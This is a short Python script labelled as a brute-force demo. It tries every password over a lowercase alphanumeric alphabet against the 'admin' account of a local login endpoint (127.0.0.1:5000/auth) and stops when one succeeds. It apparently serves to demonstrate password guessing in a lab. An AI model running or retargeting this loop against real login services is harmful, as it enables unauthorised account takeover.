# utf-8
# bruteforce demo

import requests

def dec_to_pass(num):

    password = ''
    temp = num
    while temp:
        c = temp // digits
        r = temp % digits
        password += alphabet[r]
        temp = c
    return password[::-1]

alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'
#alphabet = '0123456789abcdef'
digits = len(alphabet)
last_sym = alphabet[-1]
length = 0

step = 0
while True:

    password = dec_to_pass(step)
    if len(password) < length:
        password = '0' * (length - len(password)) + password

    # print(step, password)

    r = requests.post('http://127.0.0.1:5000/auth', json={'login': 'admin', 'password': password})
    if r.status_code == 200:
        print('OK', password)
        break

    if password.count(last_sym) == length:
        length += 1
        step = 0
    else:
        step += 1

